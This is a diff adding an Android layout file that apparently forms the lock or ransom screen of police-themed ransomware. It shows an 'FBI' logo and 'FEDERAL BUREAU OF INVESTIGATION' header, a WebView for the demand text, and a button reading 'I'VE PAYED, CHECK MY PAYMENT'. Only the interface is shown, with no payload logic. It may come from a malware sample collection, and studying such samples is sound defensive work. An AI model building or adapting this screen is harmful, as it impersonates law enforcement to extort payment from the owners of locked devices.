@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout android:orientation="vertical" android:id="@id/popup_element" android:background="#ffffffff" android:padding="10.0sp" android:layout_width="fill_parent" android:layout_height="fill_parent"
+  xmlns:android="http://schemas.android.com/apk/res/android">
+    <LinearLayout android:gravity="center" android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="fill_parent">
+        <LinearLayout android:orientation="horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content">
+            <ImageView android:id="@id/imageView1" android:layout_width="120.0dip" android:layout_height="120.0dip" android:src="@drawable/fbi" />
+            <LinearLayout android:orientation="vertical" android:layout_width="wrap_content" android:layout_height="fill_parent">
+                <LinearLayout android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="20.0dip">
+                    <TextView android:textSize="50.0sp" android:textStyle="bold" android:textColor="#ff00008b" android:layout_gravity="left" android:id="@id/title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:text="FBI" />
+                </LinearLayout>
+                <TextView android:textColor="#ff000111" android:id="@id/textView1" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="8.0dip" android:text="FEDERAL BUREAU OF INVESTIGATION" />
+            </LinearLayout>
+        </LinearLayout>
+        <LinearLayout android:gravity="bottom|center" android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="fill_parent" android:layout_marginTop="5.0dip" android:baselineAligned="false">
+            <WebView android:id="@id/lending" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_weight="1.0" />
+            <Button android:textColor="@drawable/pmok_state" android:id="@id/btn_check" android:background="@drawable/pm_ok" android:layout_width="fill_parent" android:layout_height="25.0dip" android:layout_marginTop="10.0dip" android:text="I'VE PAYED, CHECK MY PAYMENT" />
+        </LinearLayout>
+    </LinearLayout>
+</LinearLayout>
